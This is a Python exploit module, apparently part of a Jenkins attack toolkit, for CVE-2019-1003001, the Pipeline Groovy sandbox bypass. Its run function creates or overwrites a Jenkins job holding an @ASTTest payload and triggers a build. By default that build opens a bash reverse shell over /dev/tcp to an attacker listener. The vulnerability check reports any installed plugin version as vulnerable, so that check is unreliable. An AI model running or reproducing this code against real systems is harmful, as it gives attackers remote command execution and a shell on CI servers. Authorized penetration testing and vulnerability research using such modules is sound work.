"""
CVE-2019-1003001: Pipeline Groovy Plugin Sandbox Bypass

Pipeline: Groovy Plugin 2.61 and earlier allowed sandboxed Groovy scripts to execute
arbitrary code by exploiting vulnerabilities in how Groovy scripts were compiled,
allowing bypass of sandbox protection.
"""

import requests
from rich.console import Console
from exploits import ExploitMetadata, ExploitResult

console = Console()

CVE_ID = "CVE-2019-1003001"
cve = CVE_ID

METADATA = ExploitMetadata(
    cve_id=CVE_ID,
    name="Pipeline Groovy Plugin Sandbox Bypass",
    description="Sandbox bypass in Pipeline Groovy allowing arbitrary code execution",
    affected_versions=["<= 2.61"],
    mitre_attack=["T1190", "T1059"],
    severity="high",
    references=[
        "https://jenkins.io/security/advisory/2019-01-08/",
        "https://nvd.nist.gov/vuln/detail/CVE-2019-1003001",
        "https://www.cvedetails.com/cve/CVE-2019-1003001"
    ],
    requires_auth=True,
    requires_crumb=True,
    tags=["rce", "sandbox-bypass", "groovy", "pipeline"]
)

affected_versions = METADATA.affected_versions
mitre_attack = METADATA.mitre_attack
severity = METADATA.severity
description = METADATA.description
requires_auth = METADATA.requires_auth
requires_crumb = METADATA.requires_crumb
tags = METADATA.tags


def check_vulnerable(tool, **kwargs):
    """
    Check if the target Jenkins instance has vulnerable Pipeline Groovy plugin.
    
    Args:
        tool: JenkinsBreaker instance
        **kwargs: Additional arguments
        
    Returns:
        bool: True if vulnerable, False otherwise
    """
    try:
        url = f"{tool.jenkins_url}/pluginManager/api/json?depth=1"
        r = requests.get(
            url,
            auth=tool.auth,
            headers=tool.custom_headers,
            proxies=tool.proxies,
            verify=False,
            timeout=10
        )
        
        if r.status_code == 200:
            data = r.json()
            for plugin in data.get('plugins', []):
                if plugin.get('shortName') == 'workflow-cps':
                    version = plugin.get('version', '')
                    console.print(f"[yellow][*] Found Pipeline: Groovy Plugin version: {version}[/yellow]")
                    return True
        return False
    except Exception as e:
        console.print(f"[red][!] Error checking vulnerability: {e}[/red]")
        return False


def run(tool, lhost=None, lport=None, **kwargs):
    """
    Exploit CVE-2019-1003001 for sandbox bypass in Pipeline Groovy.
    
    Args:
        tool: JenkinsBreaker instance
        lhost: Listener host for reverse shell
        lport: Listener port for reverse shell
        **kwargs: Additional arguments (cmd, job_name)
        
    Returns:
        ExploitResult: Result of the exploit
    """
    console.print(f"[yellow][*] Running {CVE_ID} exploit (Pipeline Groovy Sandbox Bypass)...[/yellow]")
    
    cmd = kwargs.get('cmd', f'bash -i >& /dev/tcp/{lhost}/{lport} 0>&1')
    job_name = kwargs.get('job_name', 'pwned-pipeline')
    
    console.print("[cyan][*] Attempting sandbox bypass via malicious Pipeline...[/cyan]")
    
    pipeline_script = f'''
@groovy.transform.ASTTest(value={{
    def cmd = ['/bin/bash', '-c', '{cmd}']
    cmd.execute()
}})
def x
pipeline {{
    agent any
    stages {{
        stage('Exploit') {{
            steps {{
                echo 'Sandbox bypassed'
            }}
        }}
    }}
}}
'''
    
    try:
        console.print(f"[cyan][*] Creating malicious pipeline job '{job_name}'...[/cyan]")
        
        job_xml = f'''<?xml version='1.1' encoding='UTF-8'?>
<flow-definition plugin="workflow-job@2.40">
  <description>Test pipeline</description>
  <keepDependencies>false</keepDependencies>
  <properties/>
  <definition class="org.jenkinsci.plugins.workflow.cps.CpsFlowDefinition" plugin="workflow-cps@2.61">
    <script>{pipeline_script}</script>
    <sandbox>true</sandbox>
  </definition>
  <triggers/>
  <disabled>false</disabled>
</flow-definition>'''
        
        crumb_header = tool.get_crumb()
        headers = {
            **tool.custom_headers,
            **crumb_header,
            'Content-Type': 'application/xml'
        }
        
        create_url = f"{tool.jenkins_url}/createItem?name={job_name}"
        r = requests.post(
            create_url,
            auth=tool.auth,
            headers=headers,
            data=job_xml,
            proxies=tool.proxies,
            verify=False,
            timeout=10
        )
        
        if r.status_code == 200:
            console.print(f"[green][+] Pipeline job '{job_name}' created successfully[/green]")
        elif r.status_code == 400 and 'already exists' in r.text.lower():
            console.print(f"[yellow][*] Job '{job_name}' already exists, updating...[/yellow]")
            
            config_url = f"{tool.jenkins_url}/job/{job_name}/config.xml"
            r = requests.post(
                config_url,
                auth=tool.auth,
                headers=headers,
                data=job_xml,
                proxies=tool.proxies,
                verify=False,
                timeout=10
            )
            
            if r.status_code != 200:
                return ExploitResult(
                    exploit=CVE_ID,
                    status="failed",
                    details=f"Failed to update job: HTTP {r.status_code}"
                )
        else:
            return ExploitResult(
                exploit=CVE_ID,
                status="failed",
                details=f"Failed to create job: HTTP {r.status_code}"
            )
        
        console.print(f"[cyan][*] Triggering build for '{job_name}'...[/cyan]")
        
        build_url = f"{tool.jenkins_url}/job/{job_name}/build"
        r = requests.post(
            build_url,
            auth=tool.auth,
            headers=crumb_header,
            proxies=tool.proxies,
            verify=False,
            timeout=15
        )
        
        if r.status_code in [200, 201, 302]:
            console.print(f"[green][+] Build triggered! Sandbox bypass executed.[/green]")
            console.print(f"[green][+] Check listener on {lhost}:{lport} for shell[/green]")
            return ExploitResult(
                exploit=CVE_ID,
                status="success",
                details=f"Sandbox bypassed via malicious pipeline job '{job_name}'",
                data={
                    "job_name": job_name,
                    "command": cmd,
                    "method": "@ASTTest in Pipeline script",
                    "job_url": f"{tool.jenkins_url}/job/{job_name}"
                }
            )
        else:
            return ExploitResult(
                exploit=CVE_ID,
                status="partial",
                details=f"Job created but build trigger failed: HTTP {r.status_code}"
            )
    
    except requests.exceptions.Timeout:
        console.print("[yellow][*] Request timed out - build may still be executing[/yellow]")
        return ExploitResult(
            exploit=CVE_ID,
            status="partial",
            details="Timeout during execution - build may have executed successfully"
        )
    
    except Exception as e:
        return ExploitResult(
            exploit=CVE_ID,
            status="error",
            details=f"Execution error: {str(e)}"
        )
